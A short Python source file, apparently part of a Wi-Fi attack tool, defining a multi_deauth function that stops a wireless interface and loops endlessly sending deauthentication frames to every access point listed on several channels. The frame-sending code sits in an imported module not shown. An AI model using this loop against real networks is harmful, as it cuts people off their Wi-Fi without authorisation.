import subprocess,os
from classes import *
def inlineraise(message):
    raise Exception(message)
def will_fit(len):
    width,height=os.get_terminal_size()
    if len<width:
        return True
    else:
        return False
def multi_deauth(interface:wlan_interface,common_channels:dict):
    interface.Stop_interface()
    BSSIDs=[]
    for channel in common_channels.keys():
        for MAC in common_channels[channel]:
            BSSIDs.append(bssid(MAC,channel))
    while True:
        for BSSID in BSSIDs:
            BSSID.Deauth(interface)
    